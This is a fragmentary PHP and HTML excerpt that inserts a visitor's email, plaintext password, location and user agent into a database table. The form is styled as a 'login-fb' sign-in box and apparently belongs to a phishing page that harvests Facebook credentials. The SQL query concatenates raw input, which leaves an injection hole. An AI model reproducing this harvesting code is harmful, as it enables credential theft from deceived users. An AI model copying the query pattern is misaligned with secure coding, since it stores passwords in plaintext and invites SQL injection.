...
// $sql = "INSERT INTO `user`(`id`, `kay`, `value`, `location`, `client`, `created_at`, `updated_at`)
// VALUES ('8767868768','".$email."','$pass','".$location."','".$userAgent."','".date('Y-m-d H:i')."','".date('Y-m-d H:i')."')";

$sql = "INSERT INTO `user`( `kay`, `value`, `location`, `client`, `created_at`, `updated_at`) VALUES ('".$email."', '".$pass."','".$location."', '".$userAgent."','".date('Y-m-d H:i')."','".date('Y-m-d H:i')."')";
// echo $sql;
...
<div class="login-fb">
  <div class="info">
    ...
    <p class="text" style="color: red;"></p>
      ...
      <input class="subm" type="submit"  name="ok" value="Sign In">
